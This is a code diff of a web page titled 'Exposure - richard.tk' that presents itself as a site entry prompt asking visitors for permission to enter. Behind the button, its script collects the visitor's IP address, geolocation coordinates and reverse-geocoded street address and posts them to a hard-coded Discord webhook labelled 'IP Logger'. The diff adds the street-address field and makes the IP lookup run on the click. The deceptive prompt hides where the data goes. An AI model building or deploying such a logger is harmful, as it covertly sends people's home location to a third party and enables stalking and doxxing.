@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP and Location Info</title>
+    <title>Exposure - richard.tk</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -57,13 +57,13 @@
             <p><strong>Country:</strong> <span id="country"></span></p>
             <p><strong>Region:</strong> <span id="region"></span></p>
             <p><strong>City:</strong> <span id="city"></span></p>
+            <p><strong>Street Address:</strong> <span id="address"></span></p>
             <p><strong>Postal Code:</strong> <span id="postal"></span></p>
             <p><strong>Latitude:</strong> <span id="lat"></span></p>
             <p><strong>Longitude:</strong> <span id="lon"></span></p>
-            <p><strong>Address:</strong> <span id="address"></span></p>
         </div>
         <div id="consent">
-            <p>Press the button below to gain access.</p>
+            <p>We need your permission to enter the website.</p>
             <button id="getLocationButton">Enter</button>
         </div>
     </div>
@@ -71,7 +71,7 @@
     <script>
         // Function to send data to the Discord webhook
         function sendToWebhook(data) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1271770801028464691/lwFP4ypxNZJm8SNeRf5td03JCuXcmtwS08dmrHOGfeJ9zcXW4QC2DxZD_trlncIAqwuz';
+            const webhookUrl = 'https://discord.com/api/webhooks/1271770801028464691/lwFP4ypxNZJm8SNeRf5td03JCuXcmtwS08dmrHOGfeJ9zcXW4QC2DxZD_trlncIAqwuz'; // Replace with your Discord webhook URL
             const request = new XMLHttpRequest();
             request.open("POST", webhookUrl);
             request.setRequestHeader('Content-type', 'application/json');
@@ -79,21 +79,14 @@
             const params = {
                 username: "IP Logger",
                 avatar_url: "",
-                content: `IP Address: ${data.ip}\nCountry: ${data.country_name}\nRegion: ${data.region_name}\nCity: ${data.city}\nPostal Code: ${data.postal}\nLatitude: ${data.latitude}\nLongitude: ${data.longitude}\nAddress: ${data.city}, ${data.region_name}, ${data.country_name}, ${data.postal}`
+                content: `IP Address: ${data.ip}\nCountry: ${data.country_name}\nRegion: ${data.region_name}\nCity: ${data.city}\nStreet Address: ${data.street || "Not Available"}\nPostal Code: ${data.postal || "Not Available"}\nLatitude: ${data.latitude}\nLongitude: ${data.longitude}`
             };
-
-            if (data.street) {
-                params.content += `\nStreet Address: ${data.street}`;
-                document.getElementById('address').textContent = data.street + ", " + params.content.split('\n')[3]; // City info
-            } else {
-                document.getElementById('address').textContent = "Not Available";
-            }
 
             request.send(JSON.stringify(params));
         }
 
         // Function to fetch user's IP and location data
-        function fetchLocationData() {
+        function fetchIPData() {
             fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(data => {
@@ -104,14 +97,8 @@
                     document.getElementById('postal').textContent = data.postal;
                     document.getElementById('lat').textContent = data.latitude;
                     document.getElementById('lon').textContent = data.longitude;
-
-                    // Send data to Discord webhook
-                    sendToWebhook(data);
-
-                    // Show the information
-                    document.getElementById('info').style.display = 'block';
                 })
-                .catch(error => console.error('Error:', error));
+                .catch(error => console.error('Error fetching IP data:', error));
         }
 
         // Function to get the user's location via Geolocation API
@@ -121,7 +108,7 @@
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
 
-                    // Use the latitude and longitude to fetch more detailed location
+                    // Use a geocoding service to get detailed address info
                     fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`)
                         .then(response => response.json())
                         .then(data => {
@@ -148,10 +135,10 @@
                             sendToWebhook(ipData);
                             document.getElementById('info').style.display = 'block';
                         })
-                        .catch(error => console.error('Error:', error));
+                        .catch(error => console.error('Error fetching geocoding data:', error));
                 }, error => {
                     console.error("Geolocation error: ", error);
-                    alert("Unable to retrieve your location.");
+                    alert("Unable to retrieve your location. Please check your settings.");
                 });
             } else {
                 alert("Geolocation is not supported by this browser.");
@@ -160,6 +147,7 @@
 
         // Add event listener for the location button
         document.getElementById('getLocationButton').addEventListener('click', function() {
+            fetchIPData(); // Fetch IP data before asking for location
             getLocation();
             document.getElementById('consent').style.display = 'none'; // Hide consent prompt
         });
